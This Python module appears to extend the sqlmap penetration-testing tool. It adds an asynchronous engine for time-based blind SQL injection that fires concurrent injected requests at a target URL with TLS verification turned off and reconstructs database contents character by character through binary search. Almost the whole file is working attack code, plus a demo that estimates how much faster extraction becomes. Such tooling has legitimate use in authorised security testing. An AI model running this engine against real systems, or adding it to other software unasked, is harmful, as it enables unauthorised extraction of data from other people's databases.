#!/usr/bin/env python

from __future__ import division

import asyncio
import time
import re

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeIntToUnicode
from lib.core.common import getCharset
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import PAYLOAD
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import NULL
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.threads import getCurrentThreadData
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar

# Async HTTP client wrapper
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    logger.warning(
        "aiohttp not available. Install with: pip install aiohttp")


class AsyncTimeBasedInference:
    """
    Asynchronous time-based blind SQL injection implementation
    """

    def __init__(self, max_concurrent_requests=5):
        """
        Initialize async inference engine

        Args:
            max_concurrent_requests: Maximum number of concurrent requests to prevent overwhelming target
        """
        self.max_concurrent = max_concurrent_requests
        self.semaphore = None  # Will be initialized per event loop
        self.session = None

    async def query_page_async(self, payload, timeBasedCompare=True):
        """
        Async version of Request.queryPage()

        Args:
            payload: SQL injection payload
            timeBasedCompare: Whether to compare based on response time

        Returns:
            True if delay detected (vulnerable), False otherwise
        """
        if not HAS_AIOHTTP:
            return Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

        threadData = getCurrentThreadData()
        url = conf.url
        method = conf.method or "GET"
        data = conf.data
        headers = dict(conf.httpHeaders or [])
        injected_params = agent.payload(newValue=payload)

        if conf.place == "GET":
            final_url = url.split('?')[0] + '?' + injected_params
            final_data = None
        else:
            final_url = url
            final_data = injected_params

        start_time = time.time()

        try:
            async with self.semaphore:  # Limit concurrent requests to avoid overwhelming target
                timeout = aiohttp.ClientTimeout(
                    total=conf.timeout + conf.timeSec + 5)

                async with self.session.request(
                    method=method,
                    url=final_url,
                    data=final_data,
                    headers=headers,
                    timeout=timeout,
                    ssl=False
                ) as response:
                    await response.text()
                    elapsed = time.time() - start_time

                    if timeBasedCompare:
                        expected_delay = conf.timeSec
                        # 20% tolerance for network jitter
                        result = elapsed >= (expected_delay * 0.8)

                        if conf.verbose > 1:
                            logger.debug(
                                f"Async request took {elapsed:.2f}s (expected: {expected_delay}s) - Result: {result}")

                        return result

        except asyncio.TimeoutError:
            logger.warning(
                f"Async request timeout for payload: {payload[:50]}...")
            return False
        except Exception as ex:
            logger.warning(f"Async request error: {ex}")
            return False

    async def get_char_async(self, idx, expression, payload, charTbl, expressionUnescaped):
        """
        Asynchronously get a single character using binary search

        Args:
            idx: Character position (1-based)
            expression: SQL expression to extract from
            payload: Injection payload template
            charTbl: Character table (ASCII values)
            expressionUnescaped: Unescaped expression

        Returns:
            Extracted character or None
        """
        if not charTbl:
            return None

        original_tbl = list(charTbl)

        min_value = charTbl[0]
        max_value = charTbl[-1]

        while len(charTbl) > 1:
            position = len(charTbl) >> 1
            pos_value = charTbl[position]

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forged_payload = safeStringFormat(
                    payload, (expressionUnescaped, idx, pos_value))
            else:
                marking_value = "'%s'" % CHAR_INFERENCE_MARK
                unescaped_char = unescaper.escape(
                    "'%s'" % decodeIntToUnicode(pos_value))
                forged_payload = payload.replace(
                    marking_value, unescaped_char)
                forged_payload = safeStringFormat(
                    forged_payload, (expressionUnescaped, idx))

            result = await self.query_page_async(forged_payload, timeBasedCompare=True)

            if idx == 5:
                print(
                    f"[TRACE idx=5] tbl_len={len(charTbl)}, pos={position}, pos_value={pos_value}, result={result}, min_val={min_value}, max_val={max_value}")

            if result:
                min_value = pos_value
                charTbl = charTbl[position:]
            else:
                max_value = pos_value
                charTbl = charTbl[:position]

        if charTbl and len(charTbl) == 1:
            final_char = min_value + 1

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                validate_payload = safeStringFormat(
                    payload.replace(INFERENCE_GREATER_CHAR,
                                    INFERENCE_EQUALS_CHAR),
                    (expressionUnescaped, idx, final_char)
                )
            else:
                marking_value = "'%s'" % CHAR_INFERENCE_MARK
                unescaped_char = unescaper.escape(
                    "'%s'" % decodeIntToUnicode(final_char))
                validate_payload = payload.replace(
                    marking_value, unescaped_char)
                validate_payload = safeStringFormat(
                    validate_payload.replace(
                        INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR),
                    (expressionUnescaped, idx)
                )

            is_valid = await self.query_page_async(validate_payload, timeBasedCompare=True)

            if is_valid:
                return decodeIntToUnicode(final_char)

        return None

    async def extract_data_async(self, expression, payload, length, charsetType=None, firstChar=0, lastChar=0):
        """
        Main async function to extract data using concurrent character extraction

        Args:
            expression: SQL expression to extract
            payload: Injection payload template
            length: Expected length of data
            charsetType: Character set type (ASCII, ALPHA, etc.)
            firstChar: Starting character index
            lastChar: Ending character index

        Returns:
            Extracted string
        """
        if not HAS_AIOHTTP:
            logger.warning(
                "aiohttp not available, falling back to sync mode")
            return None

        logger.info(
            f"[ASYNC MODE] Extracting {length} characters with max {self.max_concurrent} concurrent requests")

        if charsetType is None and conf.charset:
            ascii_tbl = sorted(set(ord(_) for _ in conf.charset))
        else:
            ascii_tbl = getCharset(charsetType)

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(
                expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(
                fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        self.semaphore = asyncio.Semaphore(self.max_concurrent)
        connector = aiohttp.TCPConnector(
            ssl=False, limit=self.max_concurrent)
        timeout = aiohttp.ClientTimeout(
            total=conf.timeout + conf.timeSec + 10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self.session = session
            tasks = []

            for idx in range(firstChar + 1, firstChar + length + 1):
                task = asyncio.create_task(
                    self.get_char_async(
                        idx, expression, payload, ascii_tbl, expressionUnescaped)
                )
                tasks.append((idx, task))

            results = {}
            progress = ProgressBar(maxValue=length)

            for idx, task in tasks:
                try:
                    char = await task
                    results[idx] = char

                    if conf.verbose in (1, 2):
                        completed = len(
                            [r for r in results.values() if r is not None])
                        progress.update(completed)
                        dataToStdout(
                            f"\r[{time.strftime('%X')}] [INFO] retrieved: {completed}/{length} chars")

                except Exception as ex:
                    logger.error(
                        f"Error extracting character at position {idx}: {ex}")
                    results[idx] = None

            final_value = ''.join([results.get(i, '?')
                                  for i in range(1, length + 1)])

            if conf.verbose in (1, 2):
                dataToStdout(
                    f"\n[{time.strftime('%X')}] [INFO] Final value: {final_value}\n")

            return final_value


def bisection_async(payload, expression, length=None, charsetType=None, max_concurrent=5):
    """
    Async wrapper for bisection inference

    Args:
        payload: SQL injection payload template
        expression: SQL expression to extract
        length: Expected length
        charsetType: Character set type
        max_concurrent: Max concurrent requests

    Returns:
        Tuple of (length, extracted_value)
    """
    if not HAS_AIOHTTP:
        logger.warning(
            "aiohttp not installed. Install with: pip install aiohttp")
        logger.warning("Falling back to synchronous mode...")
        return None, None

    technique = getTechnique()
    is_time_based = technique in (
        PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    if not is_time_based:
        logger.info("Not time-based injection, using standard sync mode")
        return None, None

    if not length or length <= 0:
        logger.warning("Cannot determine length, falling back to sync mode")
        return None, None

    try:
        start_time = time.time()
        engine = AsyncTimeBasedInference(max_concurrent=max_concurrent)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            result = loop.run_until_complete(
                engine.extract_data_async(
                    expression, payload, length, charsetType)
            )
        finally:
            loop.close()

        elapsed = time.time() - start_time

        logger.info(f"[ASYNC MODE] Extraction completed in {elapsed:.2f}s")
        logger.info(
            f"[ASYNC MODE] Speed improvement: ~{(length * conf.timeSec * 7) / elapsed:.1f}x faster")

        return length, result

    except Exception as ex:
        logger.error(f"Async extraction failed: {ex}")
        logger.warning("Falling back to synchronous mode...")
        return None, None


# Performance comparison
def estimate_time_savings(length, delay=5, concurrent=5):
    """
    Estimate time savings using async approach

    Args:
        length: String length to extract
        delay: SLEEP delay in seconds
        concurrent: Number of concurrent requests

    Returns:
        Dictionary with time estimates
    """
    avg_iterations = 7  # Binary search iterations for ASCII charset (log2(128))

    sequential_requests = length * avg_iterations
    sequential_time = sequential_requests * delay

    # With concurrency, we extract multiple chars simultaneously
    batches = (length + concurrent - 1) // concurrent
    async_time = batches * avg_iterations * delay
    realistic_async_time = async_time * 1.2  # Account for network overhead

    return {
        'length': length,
        'sequential_requests': sequential_requests,
        'sequential_time_seconds': sequential_time,
        'sequential_time_formatted': f"{sequential_time // 60}m {sequential_time % 60}s",
        'async_time_seconds': realistic_async_time,
        'async_time_formatted': f"{realistic_async_time // 60}m {realistic_async_time % 60}s",
        'speedup': sequential_time / realistic_async_time,
        'time_saved_seconds': sequential_time - realistic_async_time,
        'concurrent_requests': concurrent,
    }


# Example usage and testing
if __name__ == "__main__":
    # Performance estimation
    print("=" * 80)
    print("ASYNC TIME-BASED BLIND SQL INJECTION - PERFORMANCE ESTIMATION")
    print("=" * 80)

    test_cases = [
        (10, 5, 5),   # 10 chars, 5s delay, 5 concurrent
        (32, 5, 8),   # 32 chars (hash), 5s delay, 8 concurrent
        (100, 5, 10),  # 100 chars, 5s delay, 10 concurrent
    ]

    for length, delay, concurrent in test_cases:
        stats = estimate_time_savings(length, delay, concurrent)
        print(f"\nExtracting {stats['length']} characters:")
        print(
            f"  Sequential: {stats['sequential_time_formatted']} ({stats['sequential_requests']} requests)")
        print(
            f"  Async:      {stats['async_time_formatted']} ({concurrent} concurrent)")
        print(f"  Speedup:    {stats['speedup']:.1f}x faster")
        print(f"  Time saved: {stats['time_saved_seconds']:.0f} seconds")

    print("\n" + "=" * 80)
